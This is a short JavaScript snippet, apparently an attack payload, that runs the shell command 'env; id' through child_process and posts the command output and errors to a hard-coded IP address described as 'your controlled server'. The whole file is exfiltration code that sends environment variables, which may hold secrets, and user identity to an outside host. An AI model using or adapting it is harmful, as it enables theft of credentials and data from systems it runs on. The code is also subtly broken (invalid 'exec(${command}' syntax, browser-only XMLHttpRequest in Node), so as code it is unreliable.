const { exec } = require('child_process');

// Function to send data to your controlled server
function sendData(data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://10.102.130.229:5555", true);
    //xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    //xhr.send("data=" + encodeURIComponent(data));
    xhr.send("data=" + data);
}

command = "env; id"
sendData(`Running: ${command}`)

exec(${command}, (error, stdout, stderr) => {
    if (error) {
        sendData(`Error: ${stderr}`);
    }
    sendData(`Command output: ${stdout}`);
});

